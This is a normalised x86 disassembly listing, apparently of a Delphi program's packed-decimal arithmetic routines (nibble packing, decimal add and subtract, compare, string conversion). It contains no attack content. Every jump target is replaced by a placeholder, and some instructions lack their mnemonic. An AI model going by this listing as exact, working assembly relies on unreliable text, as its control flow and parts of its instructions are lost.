mov ch [ ebp + 0xc ]
mov cl [ ebp + 0x18 ]
cmp ch [ ebp + 0x14 ]
jae r-xdata
sub cl 0x1
cmp cl 0x0
je r-xdata
add cl [ ebp + 0x14 ]
call sub_46b274
cmp ch [ ebp + 0x14 ]
je r-xdata
mov ah [ ebp + 0x18 ]
sub ah [ ebp + 0x10 ]
mov cl [ ebp + 0x18 ]
add cl [ ebp + 0x14 ]
add cl ch
jmp r-xdata
lodsb [ esi ]
mov dl al
shr al 0x4
or al 0x0
stosb [ edi ]
mov al dl
mov ah [ ebp + 0x18 ]
mov [ ebp + 0x10 ] ah
mov cl 0x1
jmp r-xdata
mov al 0x0
stosb [ edi ]
sub cl 0x1
jmp r-xdata
pop edx
pop ecx
pop ebx
pop edi
pop esi
pop ebp
retn 0x18
mov cl ch
call sub_46b2ac
jmp r-xdata
lodsb [ esi ]
cmp al 0x0
je r-xdata
sub cl [ ebp + 0x18 ]
call sub_46b2ac
call sub_46b274
mov cl [ ebp + 0x10 ]
cmp cl [ ebp + 0x18 ]
jbe r-xdata
mov dl al
cmp ch [ ebp + 0x14 ]
jbe r-xdata
cmp cl 0x0
je r-xdata
sub ah 0x1
cmp ah 0x0
je r-xdata
mov [ edi ] al
add edi 0x1
add ch [ ebp + 0x10 ]
mov cl 0x0
call sub_46b284
mov cl [ ebp + 0xc ]
cmp cl [ ebp + 0x14 ]
jbe r-xdata
mov ch [ ebp + 0x14 ]
sub ah 0x1
sub cl 0x2
jmp r-xdata
sub cl [ ebp + 0x14 ]
call sub_46b2ac
jmp r-xdata
cmp ah 0x0
je r-xdata
sub_46b3a0
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
mov al [ eax ]
mov [ ebp - 0x1 ] al
push esi
push edi
push ebx
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x10 ]
xor ecx ecx
mov cx [ ebp + 0x8 ]
mov dl 0x0
cld
loop r-xdata
sub al 0x30
cmp dl 0x0
jne r-xdata
lodsb [ esi ]
cmp al [ ebp - 0x1 ]
je r-xdata
cmp dl 0x0
je r-xdata
or al ah
stosb [ edi ]
shl al 0x4
mov ah al
jmp r-xdata
pop ebx
pop edi
pop esi
pop ecx
pop ebp
retn 0xc
mov al ah
stosb [ edi ]
not dl
sub_46b3ec
push ebx
push esi
push edi
add esp 0xffffffdc
mov edx [ rw-data ]
mov dl [ edx ]
mov [ esp + 0x1 ] dl
mov esi eax
mov [ esp ] 0x0
jmp r-xdata
mov bl [ esi ]
test bl bl
jne r-xdata
push esi
mov esi r-xdata
lea edi [ esp + 0x8 ]
mov ecx 0x8
[ edi ] [ esi ]
pop esi
mov al [ esp + 0x1 ]
and eax 0xff
bts [ esp + 0x4 ] eax
and ebx 0xff
bt [ esp + 0x4 ] ebx
jb r-xdata
mov al [ esp ]
add esp 0x24
pop edi
pop esi
pop ebx
retn
inc esi
mov [ esp ] 0x1
jmp r-xdata
sub_46b46c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_46b641
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ rw-data ]
mov bl [ ebx ]
mov eax esi
call sub_40442c
call sub_46b3ec
test al al
je r-xdata
mov eax esi
mov edx r-xdata
call sub_404378
je r-xdata
mov [ ebp - 0x5 ] 0x0
jmp r-xdata
mov [ ebp - 0x5 ] 0x1
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x8
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1 ] 0x2
mov ebx [ ebp - 0x4 ]
add ebx 0x2
mov eax ebx
xor ecx ecx
mov edx 0x20
call sub_402c30
jmp r-xdata
test esi esi
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b648
lea eax [ ebp - 0xc ]
call sub_403f6c
retn
mov [ ebp - 0x5 ] 0x1
mov [ ebp - 0x6 ] 0x0
lea eax [ ebp - 0xc ]
mov edx ebx
call sub_404154
mov eax [ ebp - 0xc ]
mov edx esi
call sub_404570
mov edi eax
mov eax esi
call sub_40442c
mov ebx eax
jmp r-xdata
mov al [ ebx ]
mov edx eax
and edx 0xff
bt [ rw-data ] edx
jb r-xdata
inc ebx
test di di
jbe r-xdata
cmp al 0x30
je r-xdata
dec edi
mov eax ebx
call sub_408890
lea esi [ ebx + eax - 0x1 ]
jmp r-xdata
mov al [ esi ]
and eax 0xff
bt [ rw-data ] eax
jb r-xdata
mov [ esi ] 0x0
dec esi
cmp [ ebx ] 0x2d
jne r-xdata
mov al [ ebx ]
cmp al 0x2d
je r-xdata
mov [ ebp - 0x6 ] 0x1
test di di
jbe r-xdata
inc ebx
cmp al 0x2b
jne r-xdata
dec edi
mov eax ebx
call sub_408890
mov [ ebp - 0x8 ] ax
cmp [ ebp - 0x8 ] 0x40
jbe r-xdata
inc ebx
test di di
jbe r-xdata
mov esi [ ebp - 0x4 ]
add esi 0x2
mov eax esi
xor ecx ecx
mov edx 0x20
call sub_402c30
cmp [ ebx ] 0x30
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jbe r-xdata
test di di
jbe r-xdata
dec edi
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xa
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1 ] 0x2
push esi
push ebx
mov ax [ ebp - 0x8 ]
push eax
call sub_46b3a0
jmp r-xdata
mov al [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] al
jmp r-xdata
cmp di 0x40
ja r-xdata
mov al [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] al
cmp [ ebp - 0x6 ] 0x0
je r-xdata
mov al [ ebp - 0x8 ]
mov edx eax
dec edx
mov ecx [ ebp - 0x4 ]
mov [ ecx ] dl
cmp [ ebp - 0x6 ] 0x0
je r-xdata
test di di
jbe r-xdata
mov [ ebp - 0x8 ] 0x40
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1 ] 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1 ] 0x80
jmp r-xdata
mov edx edi
sub al dl
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1 ] al
jmp r-xdata
mov edx edi
sub al dl
add al 0x80
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1 ] al
jmp r-xdata
sub_46b660
push ebp
mov ebp esp
push ecx
push esi
push ebx
mov esi [ ebp + 0xc ]
mov cx [ ebp + 0x8 ]
cld
mov [ ebp - 0x2 ] cx
pop ebx
pop esi
mov ax [ ebp - 0x2 ]
pop ecx
pop ebp
retn 0x8
lodsb [ esi ]
cmp al 0x0
jne r-xdata
shr al 0x4
cmp al 0x0
jne r-xdata
sub cx 0x1
cmp cx 0x0
je r-xdata
sub cx 0x1
sub cx 0x1
jmp r-xdata
cmp cx 0x0
je r-xdata
sub_46b6a4
push ebp
mov ebp esp
push ecx
push esi
push edi
push ebx
push ecx
push edx
mov [ ebp - 0x2 ] 0x0
mov cx [ ebp + 0x8 ]
mov dh 0x0
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x14 ]
mov esi [ ebp + 0x10 ]
mov cx [ ebp + 0x8 ]
add edi 0x1
add esi 0x1
add ebx 0x1
sub cx 0x1
cmp cx 0x2
jne r-xdata
pop edx
pop ecx
pop ebx
pop edi
pop esi
pop ecx
pop ebp
retn 0x10
cmp [ ebp - 0x2 ] 0x1
jne r-xdata
sub cx 0x1
jmp r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
mov al [ esi ]
mov ah [ ebx ]
and al 0xf
and ah 0xf
mov dl ah
sub dl al
call sub_46b264
mov ah dl
sub cx 0x1
cmp cx 0x0
je r-xdata
mov ah 0x0
mov [ ebp - 0x2 ] 0x0
jmp r-xdata
cmp cx 0x2
jbe r-xdata
mov dl 0x0
or dl ah
mov [ edi ] dl
mov al [ esi ]
mov dl [ ebx ]
shr al 0x4
shr dl 0x4
sub dl al
call sub_46b264
shl dl 0x4
or dl ah
mov [ edi ] dl
sub edi 0x1
sub esi 0x1
sub ebx 0x1
sub cx 0x1
jmp r-xdata
cmp cx 0x0
je r-xdata
sub_46b75c
push ebp
mov ebp esp
push ecx
push esi
push edi
push ebx
push ecx
push edx
mov cx [ ebp + 0x8 ]
mov dh 0x0
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x14 ]
mov esi [ ebp + 0x10 ]
mov [ ebp - 0x2 ] 0x0
mov cx [ ebp + 0x8 ]
add edi 0x1
add esi 0x1
add ebx 0x1
sub cx 0x1
cmp cx 0x2
jne r-xdata
pop edx
pop ecx
pop ebx
pop edi
pop esi
pop ecx
pop ebp
retn 0x10
cmp [ ebp - 0x2 ] 0x1
jne r-xdata
sub cx 0x1
jmp r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
mov al [ esi ]
mov ah [ ebx ]
and al 0xf
and ah 0xf
mov dl ah
add dl al
call sub_46b254
mov ah dl
sub cx 0x1
cmp cx 0x0
je r-xdata
mov ah 0x0
mov [ ebp - 0x2 ] 0x0
jmp r-xdata
cmp cx 0x2
jbe r-xdata
mov dl 0x0
or dl ah
mov [ edi ] dl
mov al [ esi ]
mov dl [ ebx ]
shr al 0x4
shr dl 0x4
add dl al
call sub_46b254
shl dl 0x4
or dl ah
mov [ edi ] dl
sub edi 0x1
sub esi 0x1
sub ebx 0x1
sub cx 0x1
jmp r-xdata
cmp cx 0x0
je r-xdata
sub_46b814
push ebp
mov ebp esp
push ecx
push esi
push edi
push ebx
push edx
mov cx [ ebp + 0xc ]
mov dx [ ebp + 0x8 ]
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x4 ] 0x0
cld
cmp dx 0x0
jle r-xdata
lodsb [ esi ]
mov ah [ edi ]
inc edi
cmp al ah
jne r-xdata
pop edx
pop ebx
pop edi
pop esi
mov eax [ ebp - 0x4 ]
pop ecx
pop ebp
retn 0x10
mov ah [ edi ]
inc edi
sub dx 0x2
cmp ah 0x0
je r-xdata
mov bl ah
mov ah al
shr ah 0x4
mov bh bl
shr bh 0x4
cmp bh ah
jne r-xdata
sub cx 0x1
sub dx 0x1
cmp cx 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
cmp bh ah
ja r-xdata
cmp cx 0x0
je r-xdata
sub cx 0x1
sub dx 0x1
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov ah al
mov bh bl
and ah 0xf
and bh 0xf
cmp cx 0x0
je r-xdata
sub_46b8c8
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov esi eax
xor edi edi
mov ebp edx
mov eax [ esi ]
mov dl [ eax ]
jmp r-xdata
xor eax eax
mov al [ esp ]
cmp edi eax
jl r-xdata
mov al [ ebp ]
and dl 0xf
shl edx 0x4
xor ecx ecx
mov cl al
shr ecx 0x4
or dl cl
mov ecx [ esi ]
mov [ ecx ] dl
mov edx eax
inc [ esi ]
inc ebp
add edi 0x2
pop edx
pop ebp
pop edi
pop esi
retn
sub_46b908
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x2 ] cx
mov esi edx
mov edi eax
mov [ ebp - 0x3 ] 0x1
xor eax eax
mov al [ edi ]
cmp ax [ ebp - 0x2 ]
jne r-xdata
mov al [ edi + 0x1 ]
test al 0x80
setne [ ebp - 0xb ]
and al 0x3f
and eax 0xff
mov [ ebp - 0xa ] ax
mov al [ ebp - 0x2 ]
mov [ esi ] al
mov al [ ebp + 0x8 ]
mov [ esi + 0x1 ] al
lea eax [ edi + 0x2 ]
mov [ ebp - 0x8 ] eax
lea ebx [ esi + 0x2 ]
mov eax ebx
xor ecx ecx
mov edx 0x20
call sub_402c30
xor eax eax
mov al [ edi ]
cmp ax [ ebp - 0x2 ]
jbe r-xdata
mov al [ edi + 0x1 ]
and al 0x3f
and eax 0xff
cmp ax [ ebp + 0x8 ]
jne r-xdata
mov edx [ ebp - 0x8 ]
push edx
mov al [ ebp - 0xa ]
mov dl [ edi ]
sub dl al
push edx
push eax
mov al [ ebp - 0x2 ]
mov dl [ ebp + 0x8 ]
and dl 0x3f
sub al dl
push eax
mov al [ ebp + 0x8 ]
and al 0x3f
push eax
push ebx
call sub_46b2bc
cmp [ ebp - 0xb ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
xor eax eax
mov al [ edi ]
push eax
call sub_46b660
cmp ax [ ebp - 0x2 ]
jbe r-xdata
push esi
mov eax edi
mov edi esi
mov esi eax
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
pop esi
jmp r-xdata
lea ebx [ esi + 0x2 ]
xor edx edx
mov dl [ esi ]
mov eax edx
shr eax 0x1
and edx 0x1
cmp edx 0x1
jne r-xdata
test [ esi + 0x1 ] 0x80
jne r-xdata
mov [ ebp - 0x3 ] 0x0
jmp r-xdata
movsx eax ax
cmp eax 0x1f
jg r-xdata
inc eax
mov al [ esi + 0x1 ]
call sub_46b8bc
mov [ esi + 0x1 ] al
mov al [ ebp - 0x3 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov [ ebx + eax ] 0x0
inc eax
cmp eax 0x20
jne r-xdata
sub_46ba34
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov edi edx
mov esi eax
mov al [ esi ]
xor edx edx
mov dl al
cmp edi edx
jl r-xdata
mov [ ebx ] al
mov al [ esi + 0x1 ]
mov [ ebx + 0x1 ] al
lea ebp [ ebx + 0x2 ]
mov eax ebp
xor ecx ecx
mov edx 0x20
call sub_402c30
lea eax [ esi + 0x2 ]
mov esi eax
jmp r-xdata
mov edi ebx
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
jmp r-xdata
xor eax eax
mov al [ ebx ]
cmp edi eax
jge r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_46c4fc
movzx eax ax
xor edx edx
mov dl [ ebx ]
add eax edx
add eax 0x2
shr eax 0x1
cmp eax 0x20
jle r-xdata
cmp [ esi ] 0x0
je r-xdata
mov edx ebp
mov ecx esi
xchg ecx eax
call sub_402988
mov eax 0x20
sub [ ebx ] 0x2
inc esi
sub_46bab4
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov esi eax
lea edi [ ebp - 0x26 ]
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov ebx edx
mov edi ebx
lea esi [ ebp - 0x26 ]
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
xor eax eax
mov al [ ebp - 0x26 ]
and eax 0x1
test eax eax
je r-xdata
lea eax [ ebx + 0x2 ]
mov [ ebp - 0x4 ] eax
xor eax eax
mov al [ ebx ]
shr eax 0x1
cmp eax 0x1f
jg r-xdata
lea eax [ ebp - 0x24 ]
lea edx [ ebx + 0x2 ]
mov [ ebp - 0x4 ] edx
mov edx [ ebp - 0x4 ]
mov [ edx ] 0x0
mov dl [ ebp - 0x26 ]
inc edx
mov [ ebx ] dl
lea edx [ ebp - 0x4 ]
mov cl [ ebp - 0x26 ]
xchg edx eax
call sub_46b8c8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
mov [ edx + eax ] 0x0
inc eax
cmp eax 0x20
jne r-xdata
sub_46bb30
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
lea edx [ ebp - 0x26 ]
mov eax ebx
call sub_46bab4
lea edx [ ebp - 0x48 ]
mov eax esi
call sub_46bab4
cmp [ ebp - 0x26 ] 0x20
ja r-xdata
mov eax esi
call sub_46ba18
push eax
mov eax ebx
call sub_46ba18
pop edx
call sub_42a444
mov ebx eax
xor eax eax
mov al [ ebp - 0x26 ]
cmp bx ax
jae r-xdata
cmp [ ebp - 0x48 ] 0x20
jbe r-xdata
xor eax eax
mov al [ ebp - 0x48 ]
cmp bx ax
jae r-xdata
mov ebx eax
xor edx edx
mov dl [ ebp - 0x48 ]
xor eax eax
mov al [ ebp - 0x26 ]
call sub_42a444
mov ebx eax
lea eax [ ebp - 0x48 ]
call sub_46c4fc
movzx eax ax
push eax
lea eax [ ebp - 0x26 ]
call sub_46c4fc
movzx eax ax
pop edx
call sub_42a444
mov esi eax
jmp r-xdata
lea ecx [ ebp - 0x6c ]
movzx esi bx
mov edx esi
lea eax [ ebp - 0x26 ]
call sub_46ba34
push esi
lea esi [ ebp - 0x6c ]
lea edi [ ebp - 0x26 ]
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
pop esi
lea ecx [ ebp - 0x6c ]
mov edx esi
lea eax [ ebp - 0x48 ]
call sub_46ba34
lea esi [ ebp - 0x6c ]
lea edi [ ebp - 0x48 ]
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov ebx eax
cmp bx 0x40
jae r-xdata
push esi
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x26 ]
mov ecx ebx
call sub_46b908
push esi
mov edx [ ebp + 0xc ]
lea eax [ ebp - 0x48 ]
mov ecx ebx
call sub_46b908
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ ebp - 0x26 ]
call sub_46c4fc
movzx eax ax
xor edx edx
mov dl [ ebp - 0x26 ]
sub edx eax
movzx edi bx
movzx eax si
sub edi eax
cmp edx edi
jg r-xdata
add bx 0x2
lea eax [ ebp - 0x48 ]
call sub_46c4fc
movzx eax ax
xor edx edx
mov dl [ ebp - 0x48 ]
sub edx eax
cmp edi edx
jl r-xdata
sub_46bc64
push ebx
push esi
push edi
push ebp
add esp 0xffffffb8
mov esi edx
mov edi eax
mov al [ edi + 0x1 ]
and al 0x80
mov dl [ esi + 0x1 ]
and dl 0x80
cmp al dl
je r-xdata
test al al
setne [ esp + 0x1 ]
lea ebp [ edi + 0x2 ]
lea ebx [ esi + 0x2 ]
push ebp
mov al [ edi + 0x1 ]
and al 0x3f
and eax 0xff
xor edx edx
mov dl [ edi ]
sub dx ax
push edx
call sub_46b660
mov [ esp ] al
push ebx
mov al [ esi + 0x1 ]
and al 0x3f
and eax 0xff
xor edx edx
mov dl [ esi ]
sub dx ax
push edx
call sub_46b660
cmp al [ esp ]
je r-xdata
test al al
je r-xdata
lea eax [ esp + 0x24 ]
push eax
push 0x0
lea ecx [ esp + 0xa ]
mov edx esi
mov eax edi
call sub_46bb30
lea ebp [ esp + 0x4 ]
lea ebx [ esp + 0x26 ]
push ebp
push ebx
xor eax eax
mov al [ esp + 0xa ]
push eax
xor eax eax
mov al [ esp + 0x30 ]
push eax
call sub_46b814
cmp al [ esp ]
jge r-xdata
mov eax 0x1
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
add esp 0x48
pop ebp
pop edi
pop esi
pop ebx
retn
neg eax
or eax 0xffffffff
jmp r-xdata
mov eax 0x1
jmp r-xdata
cmp [ esp + 0x1 ] 0x0
je r-xdata
sub_46bd2c
push ebx
push esi
push edi
add esp 0xffffffdc
mov esi ecx
mov ebx eax
push esi
mov esi edx
lea edi [ esp + 0x4 ]
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
pop esi
mov al [ esp + 0x1 ]
call sub_46b8bc
mov [ esp + 0x1 ] al
mov ecx esi
mov edx esp
mov eax ebx
call sub_46c088
add esp 0x24
pop edi
pop esi
pop ebx
retn
sub_46bd68
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_40441c
mov eax [ ebp - 0x8 ]
call sub_40441c
xor eax eax
push ebp
push sub_46be51
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_40442c
cmp [ eax ] 0x2d
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_40442c
cmp [ eax ] 0x2d
jne r-xdata
inc ebx
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_40422c
mov ecx eax
dec ecx
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_40448c
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_46aa58
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
call sub_469be8
push esi
mov edi esi
lea esi [ ebp - 0x30 ]
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
pop esi
and ebx 0x80000001
jns r-xdata
inc ebx
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_40422c
mov ecx eax
dec ecx
mov edx 0x2
mov eax [ ebp - 0x8 ]
call sub_40448c
test ebx ebx
je r-xdata
dec ebx
or ebx 0xfffffffe
inc ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46be58
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_403f90
retn
mov al [ esi + 0x1 ]
and al 0x3f
or al 0x80
mov [ esi + 0x1 ] al
sub_46be60
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46bebc
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_46c3b8
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_46c3b8
mov eax [ ebp - 0x8 ]
mov ecx edi
pop edx
call sub_46bd68
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46bec3
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f90
retn
sub_46becc
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_40441c
mov eax [ ebp - 0x8 ]
call sub_40441c
xor eax eax
push ebp
push sub_46c002
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_404378
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405e60
mov eax [ ebp - 0x10 ]
call sub_4693a4
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_40442c
cmp [ eax ] 0x2d
jne r-xdata
mov bl 0xa
xor edi edi
mov bl [ esi + 0x1 ]
and bl 0x3f
test bl bl
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_40442c
cmp [ eax ] 0x2d
jne r-xdata
inc edi
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_40422c
mov ecx eax
dec ecx
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_40448c
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_46b138
mov eax [ ebp - 0x14 ]
lea ecx [ ebp - 0xc ]
xor edx edx
mov dl bl
call sub_469c9c
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0xc ]
call sub_469be8
push esi
push edi
mov edi esi
lea esi [ ebp - 0x38 ]
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
pop edi
pop esi
and edi 0x80000001
jns r-xdata
inc edi
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_40422c
mov ecx eax
dec ecx
mov edx 0x2
mov eax [ ebp - 0x8 ]
call sub_40448c
test edi edi
je r-xdata
dec edi
or edi 0xfffffffe
inc edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c009
lea eax [ ebp - 0x14 ]
mov edx 0x5
call sub_403f90
retn
mov al [ esi + 0x1 ]
and al 0x3f
or al 0x80
mov [ esi + 0x1 ] al
sub_46c01c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46c078
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_46c3b8
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_46c3b8
mov eax [ ebp - 0x8 ]
mov ecx edi
pop edx
call sub_46becc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c07f
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f90
retn
sub_46c088
push ebx
push esi
push edi
push ebp
add esp 0xffffffac
mov esi ecx
mov [ esp ] edx
mov ebx eax
lea eax [ esp + 0x2f ]
push eax
push 0x1
lea ecx [ esp + 0x15 ]
mov edx [ esp + 0x8 ]
mov eax ebx
call sub_46bb30
movzx ebp [ esp + 0xd ]
movzx edi [ esp + 0xe ]
test [ ebx + 0x1 ] 0x80
setne al
mov ebx eax
mov eax [ esp ]
test [ eax + 0x1 ] 0x80
setne [ esp + 0xc ]
mov eax ebp
mov [ esi ] al
cmp bl [ esp + 0xc ]
je r-xdata
mov eax edi
mov [ esi + 0x1 ] al
jmp r-xdata
mov al [ esp + 0xe ]
and al 0x3f
mov dl [ esp + 0x30 ]
and dl 0x3f
cmp al dl
jb r-xdata
lea eax [ esp + 0xf ]
mov [ esp + 0x4 ] eax
lea eax [ esp + 0x31 ]
mov [ esp + 0x8 ] eax
lea edi [ esi + 0x2 ]
mov eax edi
xor ecx ecx
mov edx 0x20
call sub_402c30
cmp bl [ esp + 0xc ]
jne r-xdata
mov eax edi
call sub_46b8bc
mov [ esi + 0x1 ] al
mov eax [ esp + 0x4 ]
push eax
push ebp
call sub_46b660
movzx ebx ax
mov eax [ esp + 0x8 ]
push eax
push ebp
call sub_46b660
movzx eax ax
cmp eax ebx
jge r-xdata
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0xc ]
push eax
push edi
push ebp
call sub_46b75c
jmp r-xdata
cmp ebx eax
jge r-xdata
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0xc ]
push eax
push edi
push ebp
call sub_46b6a4
jmp r-xdata
add esp 0x54
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0xc ]
push eax
push ebp
push ebp
call sub_46b814
test eax eax
jl r-xdata
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push eax
push edi
push ebp
call sub_46b6a4
mov al [ esi + 0x1 ]
call sub_46b8bc
mov [ esi + 0x1 ] al
jmp r-xdata
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push eax
push edi
push ebp
call sub_46b6a4
mov al [ esi + 0x1 ]
call sub_46b8bc
mov [ esi + 0x1 ] al
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0xc ]
push eax
push edi
push ebp
call sub_46b6a4
jmp r-xdata
sub_46c1f4
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
jle r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
movsx edx [ edx - 0x9 ]
cmp eax edx
je r-xdata
test bl bl
ja r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebx + 0x30 ]
call sub_46c1d8
pop ecx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jle r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x11 ]
call sub_46c1d8
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov al 0x30
call sub_46c1d8
pop ecx
mov eax [ ebp + 0x8 ]
inc [ eax - 0x10 ]
pop ebx
pop ebp
retn
sub_46c270
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x9 ] cl
mov [ ebp - 0x14 ] dx
mov edi eax
movsx eax [ ebp - 0x14 ]
add eax 0x3
call sub_407e6c
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_46c35f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov al [ eax ]
mov [ ebp - 0x11 ] al
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor ebx ebx
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
movsx esi [ ebp - 0x14 ]
cmp esi [ ebp - 0x10 ]
jg r-xdata
push ebp
xor eax eax
mov al [ edi + ebx ]
shr eax 0x4
call sub_46c1f4
pop ecx
cmp esi [ ebp - 0x10 ]
jle r-xdata
jmp r-xdata
inc ebx
push ebp
mov al [ edi + ebx ]
and al 0xf
call sub_46c1f4
pop ecx
